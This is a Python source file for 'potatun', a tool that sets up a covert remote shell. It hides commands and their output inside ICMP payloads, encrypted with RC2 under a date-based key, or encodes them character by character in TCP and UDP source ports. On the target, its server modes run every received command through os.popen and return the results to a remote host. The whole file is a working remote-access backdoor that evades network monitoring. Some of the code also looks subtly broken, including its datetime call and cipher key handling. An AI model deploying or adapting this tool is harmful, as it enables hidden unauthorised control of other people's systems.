#!/usr/bin/env python3

from __future__ import unicode_literals, print_function
from prompt_toolkit import PromptSession, HTML, print_formatted_text as print
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.styles import Style
from prompt_toolkit.shortcuts import ProgressBar

from Crypto.Cipher import ARC2

import os
import base64
import time
import datetime
import hashlib
import argparse
from scapy.all import *

def shellExec(cmd):
   return os.popen(cmd).read()

def encrypt(m):
  dt = datetime.today()
  key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
  cipher = ARC2.new(key, ARC2.MODE_CFB, key[:8])
  return cipher.encrypt(m)

def decrypt(m):
  dt = datetime.today()
  key = hashlib.sha1((str(dt.year) + str(dt.month) + str(dt.day)).encode('utf-8')).hexdigest()
  cipher = ARC2.new(key, ARC2.MODE_CFB, key[:8])
  return cipher.decrypt(m)

def throwICMP(cmd, ip, intface):
  data = IP(dst=ip)/ICMP(id=0x0001, seq=0x1)/encrypt(cmd)
  send(data, iface=str(intface), verbose=True)

def stopICMP(x):
  if Raw in x:
    if len(x[Raw].load) > 1:
      return True
    else:
      return False
  else:
    return False

def listenICMP(intface):
  data = sniff(iface=str(intface), filter="icmp", stop_filter=stopICMP)
  return decrypt(data[len(data)-1][Raw].load).decode('utf-8')
  
def throwTCP(cmd, ip, port, intface):
  with ProgressBar(title="Sending TCPs..") as pb:
    for i in pb(cmd):
      send(IP(dst=ip)/TCP(sport=60000+ord(i), dport=int(port)), iface=str(intface), verbose=False)
      time.sleep(0.1)

  send(IP(dst=ip)/TCP(sport=59999, dport=int(port)), iface=str(intface), verbose=False)

def stopTCP(x):
  if x[TCP].sport == 59999:
    return True
  else:
    return False

def listenTCP(intface):
  pkts = sniff(iface=str(intface), filter='tcp and dst port 443', stop_filter=stopTCP)
  o = ""
  for pkt in pkts:
    if pkt[TCP].sport == 59999:
      break
    #Uncomment to test local connections - Scapy cannot tell apart outbound/inbound packets.
    #if o[-1:] == chr(pkt[TCP].sport - 60000):
    #  continue
    o = o + str(chr(pkt[TCP].sport - 60000))
  return str(o)

def throwUDP(cmd, ip, port, intface):
  with ProgressBar(title="Sending UDPs..") as pb:
    for i in pb(cmd):
      send(IP(dst=ip)/UDP(sport=60000+ord(i), dport=int(port)), iface=str(intface), verbose=False)
      time.sleep(0.1)

  send(IP(dst=ip)/UDP(sport=59999, dport=int(port)), iface=str(intface), verbose=False)

def stopUDP(x):
  if x[UDP].sport == 59999:
    return True
  else:
    return False

def listenUDP(intface):
  pkts = sniff(iface=intface, filter='udp and dst port 443', stop_filter=stopUDP)
  o = ""
  for pkt in pkts:
    if pkt[UDP].sport == 59999:
      break
    #Uncomment to test local connections - Scapy cannot tell apart outbound/inbound packets.
    #if o[-1:] == chr(pkt[UDP].sport - 60000):
    #  continue
    o = o + str(chr(pkt[UDP].sport - 60000))
  return str(o)

def main(intface, ip, port, mode):
  session = PromptSession()
  our_style = Style.from_dict({
    '': '#884444',
  })

  if mode == "udp-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwUDP(cmd, ip, port, intface)
        time.sleep(1)
        print(HTML("<ansired><b>" + listenUDP(intface) + "</b></ansired>"))
        time.sleep(1)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "udp-s":
    while True:
      cmd = listenUDP(intface)
      data = shellExec(cmd)
      time.sleep(1)
      throwUDP(data, ip, port, intface)

  elif mode == "tcp-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwTCP(cmd, ip, port, intface)
        time.sleep(1)
        print(HTML("<ansired><b>" + listenTCP(intface) + "</b></ansired>"))
        time.sleep(1)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "tcp-s":
    while True:
      cmd = listenTCP(intface)
      data = shellExec(cmd)
      time.sleep(1)
      throwTCP(data, ip, port, intface)

  elif mode == "icmp-c":
    while True:
      try:
        cmd = session.prompt('# ', style=our_style)
        throwICMP(cmd, ip, intface)
        print(HTML("<ansired><b>" + listenICMP(intface) + "</b></ansired>"))
        time.sleep(1)
      except KeyboardInterrupt:
        break
      except EOFError:
        break
    print('Exiting..')

  elif mode == "icmp-s":
    while True:
      cmd = listenICMP(intface)
      data = shellExec(cmd)
      time.sleep(1)
      throwICMP(data, ip, intface)

if __name__ == "__main__":
  parser = argparse.ArgumentParser(description='potatun - an experimental packet tunnelling bind shell.')
  parser.add_argument('-i', type=str, help='send interface (e.g. eth0)')
  parser.add_argument('-t', type=str, help='send ip:port (e.g. 10.10.10.1:443)')
  parser.add_argument('-m', type=str, help='tunnel mode (udp-c/udp-s or tcp-c/tcp-s or icmp-c/icmp-s)')
  args = parser.parse_args()
  if args.i and args.t and args.m:
    print("> Sending/Listening on: " + args.i)
    print("> Mode: " + args.m)
    print("> Target: " + args.t)
    main(args.i, args.t.split(":")[0], args.t.split(":")[1], args.m)
  else:
    parser.print_help()
